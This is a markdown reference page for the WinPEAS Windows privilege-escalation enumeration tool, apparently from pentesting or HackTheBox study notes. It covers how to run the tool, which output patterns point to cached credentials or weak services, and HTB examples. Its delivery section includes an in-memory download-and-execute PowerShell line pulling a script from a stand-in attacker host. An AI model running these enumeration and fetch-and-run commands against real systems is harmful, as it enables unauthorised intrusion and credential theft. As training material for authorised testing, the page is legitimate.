# WinPEAS Reference

> Comprehensive Windows local privilege escalation enumeration script.
> Color-coded output highlights high-confidence privesc paths.

## Variants

```
winPEASany.exe         # x86/x64 universal
winPEASx64.exe         # x64 only
winPEASx86.exe         # x86 only
winPEAS.bat            # batch — for CLM-restricted targets
winPEAS.ps1            # PowerShell — easier to deliver
```

## Usage

```powershell
# basic
.\winPEASany.exe

# quiet mode (less noise; recommended)
.\winPEASany.exe quiet

# specific section only (faster)
.\winPEASany.exe systeminfo
.\winPEASany.exe userinfo
.\winPEASany.exe applicationsinfo
.\winPEASany.exe processesinfo
.\winPEASany.exe servicesinfo
.\winPEASany.exe filesinfo
.\winPEASany.exe networkinfo

# capture to file
.\winPEASany.exe quiet > peas.txt
```

## Output sections (priority for review)

1. **System Information** — OS, hotfixes, AV products, defender state.
2. **Users Information** — current user, groups, privileges, sessions.
3. **Processes Information** — non-Microsoft, services running with
   privileges.
4. **Services Information** — modifiable services, weak permissions,
   unquoted paths.
5. **Applications Information** — installed software / version → CVE
   candidates.
6. **Network Information** — listening sockets (great for
   internal-service privesc).
7. **Files & Folders** — credentials in config files, password hints.

## Highest-signal output to look for

| Output | Pattern |
|---|---|
| `[+]` red | High-confidence privesc opportunity |
| `Default*Password` | Winlogon autologon |
| `cmdkey /list` non-empty | Cached creds |
| `AlwaysInstallElevated == 1` | MSI privesc |
| `wsuspect` URL not HTTPS | WSUS attack |
| Unquoted service path | Path-injection privesc |
| Modifiable service binary / config | Direct service hijack |
| `SeImpersonatePrivilege Enabled` | Potato candidate |

## Delivery

```powershell
# in evil-winrm
upload winPEASany.exe
.\winPEASany.exe quiet > peas.txt
type peas.txt | more
download peas.txt /local/path/peas.txt
```

```powershell
# in-memory PowerShell variant
IEX (New-Object Net.WebClient).DownloadString('http://atk/winPEAS.ps1')
Invoke-winPEAS
```

## Common Mistakes

- Running without `quiet` — output is too colourful and slow to parse.
- Trusting `[+]` blindly — always verify (a flagged finding may be
  contextually irrelevant).
- Not running it at all — many privesc paths are missed by manual
  enumeration alone.

## Real HTB Examples

- **Sauna** — flags the autologon registry entry (`svc_loanmgr`).
- **Jeeves** — would flag `SeImpersonate` immediately.
- **Optimum** — useful but kernel privesc still requires `wes.py`.
- **Granny / Grandpa / Bastard** — flags older kernel hotfix gaps.

## Related

- [`linux-privesc/sudo-gtfobins.md`](../linux-privesc/sudo-gtfobins.md) (Linux equivalent of `sudo -l` priority)
- [`tool-usage/linpeas.md`](linpeas.md)
- [`windows-privesc/winlogon-autologon.md`](../windows-privesc/winlogon-autologon.md)
- [`windows-privesc/token-impersonation.md`](../windows-privesc/token-impersonation.md)
- [`methodology/05-windows-attack-flow.md`](../methodology/05-windows-attack-flow.md)
